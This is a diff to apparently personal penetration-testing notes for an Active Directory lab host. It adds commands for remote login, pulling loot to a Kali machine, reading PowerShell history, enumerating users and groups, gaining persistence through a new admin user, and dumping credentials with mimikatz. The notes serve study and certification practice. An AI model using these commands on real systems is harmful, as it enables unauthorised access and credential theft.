@@ -51,7 +51,16 @@ evil-winrm -i <MS01 ip> -u <domain user> -p <password>
 PS something@something> download loot.txt # this downloads loot.txt from the host to your kali's current working directory
 PS something@something> upload mimikatz.exe # this uploads your mimikatz.exe from your current working directory. If your mimikatz is somewhere else, you need to provide either the absolute or relative path
 
-whoami /priv  # do this first once you are in! Maybe you get lucky and there is SeImpersonatePrivilege
+# via xfreerdp
+
+xfreerdp /d:<domain> /u:<user> /p:'<password>' /v:<MS01 IP> /dynamic-resolution /drive:shared,../Tools
+
+whoami /priv  # do this first once you are in! Maybe you get lucky and there is SeImpersonatePrivilege. If there is SeShutdown, perhaps the PE vector involves services or scheduled tasks so keep that in mind
+
+# check history
+PS something@something>Get-History
+PS something@something>(Get-PSReadlineOption).HistorySavePath  # get path where PS history is saved at
+PS something@something> type <PS history save path>
 ```
 
 2) Do manual enumeration of MS01 first. This means checking out the following folders:
@@ -61,16 +70,19 @@ whoami /priv  # do this first once you are in! Maybe you get lucky and there is 
 
 If there are anything interesting, check whether you can edit the files or add stuff to these directories. 
 
-You should also do host, user and group enumeration.
+You should also do host, user and group enumeration both for local and domain. 
 
 ```cmd
-net user /domain
+net user # enumerate local users
+net user /domain # enumerate domain users
 
 # check if any users are admins
+net user <username>
 net user <username> /domain
 
 # group Enum
 
+net group
 net group /domain
 
 net group <groupname> /domain
@@ -79,3 +91,30 @@ net group <groupname> /domain
 
 net accounts
 ```
+
+3) Use winpeas if you need to! As there are many potential vectors to priv esc, i will not elaborate further on this step.
+
+4) Great! You managed to get admin! You should do the following first:
+- Get Persistence. My preferred method is to add a new local user and grant it admin, RDP and winrm rights. This uses native LOLBAS stuff and wont crash your machine. 
+- Dump Hashes using mimikatz or nxc. Sometimes mimikatz can't work properly. I had issues getting mimikatz to run in evil-winrm (my suspicion is that there is User Access Control involved.) so you can either launch a cmd shell or RDP to get mimikatz to run or you can use nxc to do this (though you need either the Admin hash or your new custom local user who is admin). There are many ways to skin a cat so when something dont work, try another way
+
+```cmd
+# mimikatz usage. Make sure you upload mimikatz.exe, mimispool.dll, mimilib.dll and mimidrv.sys to the same directory!
+mimikatz.exe
+
+privilege::debug  # if you see 20 OK, means you are gucci. This requires the user to have the SeDebugPrivilege rights which Admins have by default. It might be possible to run mimikatz if your low level user somehow has SeDebug privs but I have not encountered this.
+
+sekurlsa::logonpasswords  # dump a whole lot of NTLM hash. You can generally ignore the Machine accounts. Note down any clear text passwords and all NTLM hashes of user accounts. Also please note the difference between a local account and a domain account. If it is a domain account, you will see 'Domain: <domain name>'. If it is a local account, you will see 'Domain: <hostname>' instead!
+
+token::elevate
+
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+```
+Using NXC, you need local admin hash/password!
+```bash
+
+```
+
+- Enumerate MS01 again as Admin.
